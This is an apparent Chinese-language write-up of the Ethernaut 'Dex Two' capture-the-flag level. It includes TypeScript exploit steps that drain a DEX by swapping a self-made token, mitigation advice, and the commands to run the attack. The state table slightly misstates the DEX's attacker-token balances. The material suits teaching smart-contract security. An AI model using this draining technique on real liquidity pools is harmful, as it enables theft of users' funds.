# Ethernaut Challenge 23: Dex Two 🏴‍☠️

## 挑戰描述

這個關卡將要求你破解 `DexTwo` 合約的流動性池，將所有的 token1 和 token2 從合約中取出。

與前一個 Dex 挑戰不同，這次你需要做的是：
1. 從 DexTwo 中提取所有的 token1
2. 從 DexTwo 中提取所有的 token2

關鍵在於你需要從 DexTwo 中提取所有流動性池中的代幣！

## 合約分析

### 關鍵漏洞分析

1. **缺乏代幣白名單驗證**：
   - `swap` 函數沒有驗證 `from` 和 `to` 代幣是否為合法的 token1 或 token2
   - 攻擊者可以使用任意 ERC20 代幣進行交換

2. **價格計算公式缺陷**：
   ```solidity
   function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
       return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
   }
   ```
   - 當攻擊者控制 `from` 代幣的餘額時，可以操控計算結果

3. **approve 函數限制**：
   - SwappableTokenTwo 的 approve 函數阻止了 DEX 作為 owner 進行 approve
   - 但不影響攻擊者創建的新代幣

## 攻擊策略

### 步驟 1: 創建惡意代幣
```typescript
const attackerTokenFactory = await ethers.getContractFactory("SwappableTokenTwo");
const attackerToken = await attackerTokenFactory.deploy(
    contract.target, 
    "Attack on Token", 
    "AOT", 
    100000
);
```

### 步驟 2: 設置 Approval
```typescript
await contract.approve(contract.target, 100000);
await attackerToken["approve(address,address,uint256)"](attacker.address, contract.target, 100000);
```

### 步驟 3: 執行第一次攻擊 (提取 token1)
```typescript
// 轉 1 個惡意代幣到 DEX
await attackerToken.transfer(contract.target, 1);

// 用 1 個惡意代幣換取所有 token1
// getSwapAmount(attackerToken, token1, 1) = (1 * 100) / 1 = 100
await contract.swap(attackerToken.target, token1, 1);
```

### 步驟 4: 執行第二次攻擊 (提取 token2)
```typescript
// 再轉 8 個惡意代幣到 DEX (使 DEX 中惡意代幣餘額為 10)
await attackerToken.transfer(contract.target, 8);

// 用 10 個惡意代幣換取所有 token2
// getSwapAmount(attackerToken, token2, 10) = (10 * 100) / 10 = 100
await contract.swap(attackerToken.target, token2, 10);
```

## 攻擊原理詳解

### 關鍵數學計算

1. **初始狀態**：
   - DEX 中 token1: 100
   - DEX 中 token2: 100
   - DEX 中 attackerToken: 0

2. **第一次攻擊後**：
   - DEX 中 token1: 0 ✅
   - DEX 中 token2: 100
   - DEX 中 attackerToken: 1

3. **第二次攻擊後**：
   - DEX 中 token1: 0 ✅
   - DEX 中 token2: 0 ✅
   - DEX 中 attackerToken: 10

### 為什麼攻擊會成功？

1. **缺乏代幣驗證**：DEX 沒有限制只能交換 token1 和 token2
2. **價格操控**：攻擊者完全控制惡意代幣的供應量
3. **計算公式利用**：通過精確控制分母（惡意代幣餘額），可以得到想要的兌換比例

## 安全建議

1. **實施代幣白名單**：
   ```solidity
   modifier onlyValidTokens(address from, address to) {
       require(from == token1 || from == token2, "Invalid from token");
       require(to == token1 || to == token2, "Invalid to token");
       require(from != to, "Cannot swap same token");
       _;
   }
   ```

2. **加強價格預言機**：
   - 使用外部價格預言機
   - 實施滑點保護
   - 添加最小流動性要求

3. **審計交易邏輯**：
   - 檢查所有代幣轉賬
   - 驗證交換前後的餘額變化
   - 實施重入攻擊保護

## 運行指令

```bash
# 安裝依賴
npm install

# 編譯合約
npx hardhat compile

# 運行攻擊腳本
npx hardhat run scripts/interact.ts --network sepolia

# 運行測試
npx hardhat test
```

## 學習要點

1. **代幣驗證的重要性**：任何 DeFi 協議都應該嚴格驗證支持的代幣
2. **價格計算的安全性**：簡單的數學公式可能被惡意利用
3. **流動性池攻擊**：攻擊者可以通過操控流動性來影響價格

這個挑戰展示了 DeFi 協議中常見的漏洞類型，提醒我們在設計金融合約時需要考慮各種邊緣情況和潛在的攻擊向量。
